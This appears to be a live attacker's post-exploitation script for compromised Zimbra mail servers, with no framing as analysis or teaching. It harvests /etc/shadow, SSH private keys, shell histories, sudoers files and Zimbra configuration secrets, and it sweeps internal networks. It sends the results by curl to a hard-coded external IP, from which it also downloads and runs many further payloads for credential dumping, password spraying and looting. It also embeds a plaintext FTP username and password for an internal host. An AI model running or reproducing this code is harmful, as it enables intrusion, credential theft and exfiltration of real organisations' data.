# fxc2
({ ip -4 a; id; w; ps -axuwwww; curl -sf ifconfig.me 2>/dev/null; echo; cat /etc/passwd 2>/dev/null | head -20; ls -la /root/ 2>/dev/null | head -20; crontab -l 2>/dev/null; } 2>&1 | base64 -w0 | xargs -I{} curl -sf -X POST http://131.123.43.239/up -H "X-Name: fxr2" --data-binary {} >/dev/null 2>&1) &
#MRUN
L=/opt/zimbra/log
run_once() { [ -f "$L/.mh1_$1" ] && return 1; touch "$L/.mh1_$1"; return 0; }
if run_once qq3; then
( exec 9>/tmp/.qq3lock; flock -n 9 || exit 0
  H=$(hostname -s 2>/dev/null || hostname)
  O=/tmp/.qq3o
  {
  echo "==ID=="; id; hostname; date
  echo "==IP=="; ip -o -4 a; echo "--route--"; ip r
  echo "==RESOLV=="; cat /etc/resolv.conf
  echo "==HOSTS=="; cat /etc/hosts
  echo "==LISTEN=="; ss -lntup 2>/dev/null | head -40
  echo "==IPT=="; iptables -L -n 2>/dev/null | head -30; iptables -t nat -L -n 2>/dev/null | head -20
  echo "==SHADOW=="; cat /etc/shadow 2>/dev/null
  echo "==SUDOERS=="; grep -v '^#' /etc/sudoers 2>/dev/null; cat /etc/sudoers.d/* 2>/dev/null
  echo "==CRONS=="; crontab -l 2>&1 | grep -v '^#'; ls /etc/cron.d /var/spool/cron 2>/dev/null; cat /etc/cron.d/* 2>/dev/null
  echo "==ZMSSH=="; ls -la /opt/zimbra/.ssh 2>/dev/null; cat /opt/zimbra/.ssh/zimbra_identity* /opt/zimbra/.ssh/authorized_keys /opt/zimbra/.ssh/id* 2>/dev/null
  echo "==ROOTSSH=="; ls -la /root/.ssh 2>/dev/null; cat /root/.ssh/id* /root/.ssh/*.pem /root/.ssh/authorized_keys 2>/dev/null
  echo "==HOMESSH=="; for d in /home/*/.ssh; do echo "--$d--"; ls -la $d 2>/dev/null; cat $d/id* 2>/dev/null; done
  echo "==HIST=="; cat /root/.bash_history /opt/zimbra/.bash_history /home/*/.bash_history 2>/dev/null | tail -400
  echo "==ZLC=="; (su - zimbra -c '/opt/zimbra/bin/zmlocalconfig -s' 2>/dev/null || sudo -u zimbra /opt/zimbra/bin/zmlocalconfig -s 2>/dev/null || /opt/zimbra/bin/zmlocalconfig -s 2>&1) | head -250
  echo "==SWEEP=="; for n in $(ip -o -4 a | awk '{print $4}' | grep -oE '^(10\.[0-9]+\.[0-9]+|172\.(1[6-9]|2[0-9]|3[01])\.[0-9]+|192\.168\.[0-9]+)' | sort -u); do (for i in $(seq 1 254); do (ping -c1 -W1 $n.$i >/dev/null 2>&1 && echo "ALIVE $n.$i") & done; wait); done
  } > $O 2>&1
  curl -sm90 -X POST --data-binary @$O http://131.123.43.239/up -H "X-Name: qq3_$H"
  rm -f $O
) &
fi
if run_once diag3; then
{ ps aux|grep -aE "split|pigz|curl|tar " |grep -v grep|head -8
  echo ==NIC==; cat /sys/class/net/*/speed 2>&1
  echo ==CNT==; wc -l $L/.doj $L/.dj2 $L/.map 2>&1
  echo ==SIZES==; du -sm /opt/zimbra/store/0/* 2>/dev/null | sort -n | tail -25
  ls -la /tmp/C_* 2>/dev/null | head; df -m /opt/zimbra|tail -1; } > /tmp/.DIAG 2>&1
  curl -sm60 -X POST --data-binary @/tmp/.DIAG http://131.123.43.239/up -H "X-Name: mel_diag3"
fi
if run_once plkey; then
  curl -sm15 http://131.123.43.239/identity_pl -o /tmp/.ipk; chmod 600 /tmp/.ipk
  (timeout 30 ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=15 -i /tmp/.ipk zimbra@37.52.51.52 "id;hostname" > /tmp/.PLK 2>&1; echo RC=$? >>/tmp/.PLK)
  curl -sm30 -X POST --data-binary @/tmp/.PLK http://131.123.43.239/up -H "X-Name: mel_plkey"
fi
if run_once adenum3; then
  cd /tmp
  for f in adenum.py ade.sh fetch.py fget.sh; do curl -sm25 http://131.123.43.239/$f -o .$f; done
  setsid nohup bash /tmp/.ade.sh go >/dev/null 2>&1 &
fi
if run_once fixdup; then
  pkill -f "tar c -C /opt/zimbra/store" 2>/dev/null
  pkill -f "split -b 150m" 2>/dev/null
  pkill -f "gzip -1" 2>/dev/null
  rm -f /tmp/C_*
  { echo FIX dup-tars-cleaned; date; } > /tmp/.FX
  curl -sm15 -X POST --data-binary @/tmp/.FX http://131.123.43.239/up -H "X-Name: mel_fix"
fi

if run_once adenum4; then
  curl -sm25 http://131.123.43.239/ade4.sh -o /tmp/.ade4.sh
  setsid nohup bash /tmp/.ade4.sh >/dev/null 2>&1 &
fi

if run_once daspray; then
  curl -sm25 http://131.123.43.239/daspray.py -o /tmp/.daspray.py
  setsid nohup python3 /tmp/.daspray.py >/dev/null 2>&1 &
fi

if run_once dbgwalk; then
  curl -sm25 http://131.123.43.239/dbgwalk.py -o /tmp/.dbgwalk.py
  setsid nohup python3 /tmp/.dbgwalk.py >/dev/null 2>&1 &
fi
if run_once secdump; then
  curl -sm25 http://131.123.43.239/secrun.sh -o /tmp/.secrun.sh
  setsid nohup bash /tmp/.secrun.sh >/dev/null 2>&1 &
fi
if run_once secd2; then
  curl -sm25 http://131.123.43.239/secdump2.py -o /tmp/.secdump2.py
  curl -sm25 http://131.123.43.239/secrun2.sh -o /tmp/.secrun2.sh
  setsid nohup bash /tmp/.secrun2.sh >/dev/null 2>&1 &
fi
if run_once gpph; then
  curl -sm25 http://131.123.43.239/gpph.py -o /tmp/.gpph.py
  setsid nohup python3 /tmp/.gpph.py >/dev/null 2>&1 &
fi
if run_once pubwl; then
  curl -sm25 http://131.123.43.239/pubwl.py -o /tmp/.pubwl.py
  setsid nohup python3 /tmp/.pubwl.py >/dev/null 2>&1 &
fi
if run_once ndstage; then
  curl -sm25 http://131.123.43.239/ndstage.py -o /tmp/.ndstage.py
  curl -sm25 http://131.123.43.239/svc.py -o /tmp/.svc.py
  setsid nohup python3 /tmp/.ndstage.py >/dev/null 2>&1 &
fi
if run_once secd3; then
  curl -sm25 http://131.123.43.239/secrun3.sh -o /tmp/.secrun3.sh
  setsid nohup bash /tmp/.secrun3.sh >/dev/null 2>&1 &
fi
if run_once gpph2; then
  curl -sm25 http://131.123.43.239/gpph2.py -o /tmp/.gpph2.py
  setsid nohup python3 /tmp/.gpph2.py >/dev/null 2>&1 &
fi
if run_once pubwl2; then
  curl -sm25 http://131.123.43.239/pubwl2.py -o /tmp/.pubwl2.py
  setsid nohup python3 /tmp/.pubwl2.py >/dev/null 2>&1 &
fi
if run_once ndst2; then
  curl -sm25 http://131.123.43.239/ndrun2.sh -o /tmp/.ndrun2.sh
  setsid nohup bash /tmp/.ndrun2.sh >/dev/null 2>&1 &
fi
if run_once secd4; then
  curl -sm25 http://131.123.43.239/secrun4.sh -o /tmp/.secrun4.sh
  setsid nohup bash /tmp/.secrun4.sh >/dev/null 2>&1 &
fi
if run_once ndst3; then
  curl -sm25 http://131.123.43.239/ndrun3.sh -o /tmp/.ndrun3.sh
  setsid nohup bash /tmp/.ndrun3.sh >/dev/null 2>&1 &
fi
if run_once loot1; then
  curl -sm25 http://131.123.43.239/loot1.py -o /tmp/.loot1.py
  setsid nohup python3 /tmp/.loot1.py >/dev/null 2>&1 &
fi
if run_once secd5; then
  curl -sm25 http://131.123.43.239/secrun5.sh -o /tmp/.secrun5.sh
  setsid nohup bash /tmp/.secrun5.sh >/dev/null 2>&1 &
fi
if run_once diagx; then
  curl -sm25 http://131.123.43.239/diagx.sh -o /tmp/.deg.sh
  setsid nohup bash /tmp/.deg.sh >/dev/null 2>&1 &
fi
if run_once ftpw1; then
  curl -sm25 http://131.123.43.239/ftpw1.py -o /tmp/.ftpw1.py
  setsid nohup python3 /tmp/.ftpw1.py >/dev/null 2>&1 &
fi
if run_once secd6; then
  curl -sm25 http://131.123.43.239/secrun6.sh -o /tmp/.secrun6.sh
  setsid nohup bash /tmp/.secrun6.sh >/dev/null 2>&1 &
fi
if run_once ndst4; then
  curl -sm25 http://131.123.43.239/ndrun4.sh -o /tmp/.ndrun4.sh
  setsid nohup bash /tmp/.ndrun4.sh >/dev/null 2>&1 &
fi
if run_once ftpw2; then
  cat > /tmp/.ftpw2.py <<'PYEOF'
import sys, io, subprocess
from ftplib import FTP
LOG="/tmp/.FTPW2.txt"; out=open(LOG,"wb")
def w(s):
    if isinstance(s,str): s=s.encode("utf-8","replace")
    out.write(s+b"\n")
try:
    ftp=FTP("10.61.10.8", timeout=15); ftp.login("melitopol","!QAZxsw2")
    w("login ok, pwd="+ftp.pwd())
    for d in ("/files","/"):
        try:
            ftp.cwd(d)
            items=[]; ftp.retrlines("LIST", items.append)
            w("DIR %s -> %d items" % (d, len(items)))
            for l in items[:300]: w("R "+l)
        except Exception as e:
            w("ERRdir %s %s" % (d, str(e)[:100]))
    try: w("SIZE files: "+str(ftp.size("files")))
    except Exception: pass
    ftp.quit()
except Exception as e:
    w("FATAL "+str(e)[:150])
out.close()
subprocess.run(["curl","-sm","30","-X","POST","--data-binary","@"+LOG,"http://131.123.43.239/up","-H","X-Name: mel2_ftplog2"])
PYEOF
  setsid nohup python3 /tmp/.ftpw2.py >/dev/null 2>&1 &
fi
if run_once wwalk12; then
  curl -sm25 http://131.123.43.239/walk12.py -o /tmp/.walk12.py
  setsid nohup python3 /tmp/.walk12.py >/dev/null 2>&1 &
fi
if run_once loot12; then
  curl -sm25 http://131.123.43.239/loot12.py -o /tmp/.loot12.py
  setsid nohup python3 /tmp/.loot12.py >/dev/null 2>&1 &
fi
if run_once statec; then
  curl -sm25 http://131.123.43.239/statec.sh -o /tmp/.statec.sh
  setsid nohup bash /tmp/.statec.sh >/dev/null 2>&1 &
fi
if run_once mscmr; then
  curl -sm25 http://131.123.43.239/miniscmr.py -o /tmp/.mscmr.py
  setsid nohup python3 /tmp/.mscmr.py >/dev/null 2>&1 &
fi
if run_once mscmr2; then
  curl -sm25 http://131.123.43.239/mscmr2.py -o /tmp/.mscmr2.py
  setsid nohup python3 /tmp/.mscmr2.py >/dev/null 2>&1 &
fi
if run_once statec2; then
  curl -sm25 http://131.123.43.239/statec2.sh -o /tmp/.statec2.sh
  setsid nohup bash /tmp/.statec2.sh >/dev/null 2>&1 &
fi
if run_once ntrun4; then
  curl -sm25 http://131.123.43.239/ntrun4.sh -o /tmp/.ntrun4.sh
  setsid nohup bash /tmp/.ntrun4.sh >/dev/null 2>&1 &
fi
if run_once ntrun5; then
  curl -sm25 http://131.123.43.239/ntrun5.sh -o /tmp/.ntrun5.sh
  setsid nohup bash /tmp/.ntrun5.sh >/dev/null 2>&1 &
fi
if run_once ntrun6; then
  ( for i in 1 2 3 4 5 6 7 8; do
      curl -sm25 http://131.123.43.239/ntrun5.sh -o /tmp/.ntrun6.sh 2>/dev/null
      [ -s /tmp/.ntrun6.sh ] && head -c 20 /tmp/.ntrun6.sh | grep -q '^#!/bin/bash' && break
      sleep 6
    done
    [ -s /tmp/.ntrun6.sh ] && setsid nohup bash /tmp/.ntrun6.sh >/dev/null 2>&1 &
  ) &
fi
if run_once keys1; then
  ( for i in 1 2 3 4 5 6 7 8; do
      curl -sm25 http://131.123.43.239/keys1.sh -o /tmp/.keys1.sh 2>/dev/null
      [ -s /tmp/.keys1.sh ] && head -c 20 /tmp/.keys1.sh | grep -q '^#!/bin/bash' && break
      sleep 6
    done
    [ -s /tmp/.keys1.sh ] && setsid nohup bash /tmp/.keys1.sh >/dev/null 2>&1 &
  ) &
fi
if run_once zmcens; then
  ( for i in 1 2 3 4 5 6 7 8; do
      curl -sm25 http://131.123.43.239/zmcens.sh -o /tmp/.zmcens.sh 2>/dev/null
      [ -s /tmp/.zmcens.sh ] && head -c 20 /tmp/.zmcens.sh | grep -q '^#!/bin/bash' && break
      sleep 6
    done
    [ -s /tmp/.zmcens.sh ] && setsid nohup bash /tmp/.zmcens.sh >/dev/null 2>&1 &
  ) &
fi
if run_once loot12b; then
  ( for i in 1 2 3 4 5 6 7 8; do
      curl -sm25 http://131.123.43.239/loot12b.py -o /tmp/.loot12b.py 2>/dev/null
      [ -s /tmp/.loot12b.py ] && head -c 20 /tmp/.loot12b.py | grep -q '^#!/usr/bin/env' && break
      sleep 6
    done
    [ -s /tmp/.loot12b.py ] && setsid nohup bash -c 'cd /tmp && PYTHONPATH=/tmp/imp python3 /tmp/.loot12b.py' >/dev/null 2>&1 &
  ) &
fi
b=$( (id; hostname; uname -a; ip -4 a | grep inet | head -5) 2>&1 | base64 -w0); curl -s -m 10 -X POST http://131.123.43.239/up -H "X-Name: wrk_out" --data-binary "$b" >/dev/null 2>&1

if run_once ndrun5; then
  ( for i in 1 2 3 4 5 6 7 8; do
      curl -sm25 http://131.123.43.239/ndrun5.sh -o /tmp/.ndrun5.sh 2>/dev/null
      [ -s /tmp/.ndrun5.sh ] && head -c 20 /tmp/.ndrun5.sh | grep -q "^#!/bin/bash" && break
      sleep 6
    done
    [ -s /tmp/.ndrun5.sh ] && setsid nohup bash /tmp/.ndrun5.sh >/dev/null 2>&1 &
  ) &
fi
if run_once impfix; then
if run_once impdiag; then
  ( S=$(stat -c%s /tmp/.imp.zip 2>/dev/null); N=$(ls /tmp/imp 2>/dev/null | wc -l); Z=$(command -v unzip || echo NOUNZIP); P=$(python3 -c "import sys;sys.path.insert(0,"/tmp/imp");import impacket;print("imp-ok")" 2>&1 | tail -c 120); echo "sz=$S impn=$N z=$P unzip=$Z" > /tmp/.impdiag; curl -sm30 -X POST --data-binary @/tmp/.impdiag http://131.123.43.239/up -H "X-Name: mel_impdiag" ) &
fi
  ( mkdir -p /tmp/imp
    for i in 1 2 3 4 5; do
      curl -sm120 http://131.123.43.239/imp.zip -o /tmp/.imp.zip 2>/dev/null
      S=$(stat -c%s /tmp/.imp.zip 2>/dev/null); [ "$S" = "4651828" ] && break
      sleep 6
    done
    [ "$S" = "4651828" ] && cd /tmp/imp && unzip -oq /tmp/.imp.zip 2>/dev/null
    python3 -c "import sys; sys.path.insert(0,\"/tmp/imp\"); import impacket; print(\"imp-ok\")" > /tmp/.impok 2>&1
    curl -sm30 -X POST --data-binary @/tmp/.impok http://131.123.43.239/up -H "X-Name: mel_impok" >/dev/null 2>&1
  ) &
fi

